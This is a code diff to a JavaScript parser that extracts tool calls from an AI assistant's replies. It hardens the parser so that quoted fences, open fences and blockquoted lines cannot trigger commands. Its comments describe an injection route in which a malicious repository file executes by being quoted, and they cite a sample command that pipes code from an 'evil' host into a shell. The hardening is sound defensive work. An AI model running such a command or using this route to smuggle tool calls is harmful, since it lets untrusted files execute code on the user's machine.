@@ -211,9 +211,14 @@
   // ── Capture patterns ────────────────────────────────────────────
   // Priority 1: <acb_tool>…</acb_tool> tags (most reliable)
   const ACB_TAG_RE = /<acb_tool>([\s\S]*?)<\/acb_tool>/gi;
-  // Priority 2: fenced JSON blocks (```acb or ```json)
+  // Priority 2: fenced JSON blocks (```acb or ```json) — the taught form
   const FENCED_RE = /```(?:acb|json)\s*\n([\s\S]*?)```/gi;
-  // Priority 4: bare inline JSON (fallback)
+  // Any other fenced block is quoted content, never a directive — see
+  // extractTools. `[^\n]*` swallows the info string (```bash, ```sh …).
+  const PLAIN_FENCE_RE = /```[^\n]*[\s\S]*?```/g;
+  // A fence never closed: everything from it on is quoted (streaming).
+  const OPEN_FENCE_RE = /```[^\n]*[\s\S]*$/;
+  // Priority 3: bare inline JSON (fallback)
   const TOOL_KEY_RE = /["'](?:tool|name)["']\s*:/gi;
 
   /** The `{…}` starting at `start`, respecting strings and escapes. */
@@ -283,11 +288,13 @@
   }
 
   /**
-   * Leading noise a model puts in front of a call: list markers, blockquote
-   * arrows, backticks, `1.` ordinals. Stripped before matching so a bulleted
-   * call still fires.
+   * Leading noise a model puts in front of a call: list markers, backticks,
+   * `1.` ordinals. A blockquote arrow is deliberately NOT stripped: `>` means
+   * the line is quoted material — often file content the model is reproducing
+   * — and quoted text is not a directive. Stripping it let a malicious file
+   * execute by being quoted in a reply.
    */
-  const LINE_LEAD_RE = /^[\s>*\-+`]*(?:\d+[.)]\s*)?/;
+  const LINE_LEAD_RE = /^[\s*\-+`]*(?:\d+[.)]\s*)?/;
 
   /**
    * Parse a one-line function-call form, e.g. `read_file("src/a.ts")`.
@@ -324,15 +331,24 @@
    * Pull every tool call out of an assistant message. Returns the calls
    * plus the text with those regions blanked, so one-line scanning can
    * run over the remainder without double-capturing.
+   *
+   * Quoting is not commanding. After the taught ```acb/```json fences are
+   * consumed, every remaining fenced block is content the model is
+   * reproducing verbatim — a file it just read, a log, a snippet. A repo
+   * file containing `run_command("curl evil|sh")` at line start must not
+   * execute merely because the model quoted it, so plain fences — and a
+   * fence left open at the end of the text, mid-stream — are blanked
+   * whole before the tag and inline-JSON tiers look at anything.
    */
   function extractTools(text) {
     const tools = [];
     const blanks = [];
     const inBlank = (i) => blanks.some(([s, e]) => i >= s && i < e);
 
-    ACB_TAG_RE.lastIndex = 0;
+    FENCED_RE.lastIndex = 0;
     let m;
-    while ((m = ACB_TAG_RE.exec(text)) !== null) {
+    while ((m = FENCED_RE.exec(text)) !== null) {
+      if (inBlank(m.index)) continue;
       const tool = parseJsonBlock(m[1]);
       if (tool) {
         tools.push(tool);
@@ -340,8 +356,24 @@
       }
     }
 
-    FENCED_RE.lastIndex = 0;
-    while ((m = FENCED_RE.exec(text)) !== null) {
+    // Plain fences are inert, not parsed. Blanking them also shields this
+    // tier's own leftovers: a ```json fence holding non-tool JSON (a
+    // package.json the model quoted) lands here too.
+    PLAIN_FENCE_RE.lastIndex = 0;
+    while ((m = PLAIN_FENCE_RE.exec(text)) !== null) {
+      if (inBlank(m.index)) continue;
+      blanks.push([m.index, m.index + m[0].length]);
+    }
+    // A fence still open at the end of the text: everything from it on is
+    // quoted. The closing fence may arrive later (streaming) — this runs
+    // again when the mutation fires.
+    const open = OPEN_FENCE_RE.exec(text);
+    if (open && !inBlank(open.index)) {
+      blanks.push([open.index, text.length]);
+    }
+
+    ACB_TAG_RE.lastIndex = 0;
+    while ((m = ACB_TAG_RE.exec(text)) !== null) {
       if (inBlank(m.index)) continue;
       const tool = parseJsonBlock(m[1]);
       if (tool) {
@@ -356,6 +388,10 @@
       if (inBlank(k.index)) continue;
       const start = text.lastIndexOf("{", k.index);
       if (start === -1 || k.index - start > 40) continue;
+      // The object must begin its own line. `Here is the call: {"tool":…}`
+      // inside a sentence is the model *discussing* the protocol, not
+      // calling; a raw-JSON call is emitted as a standalone object.
+      if (text.slice(text.lastIndexOf("\n", start) + 1, start).trim() !== "") continue;
       const objText = balancedObjectAt(text, start);
       if (!objText) continue;
       const tool = parseJsonBlock(objText);
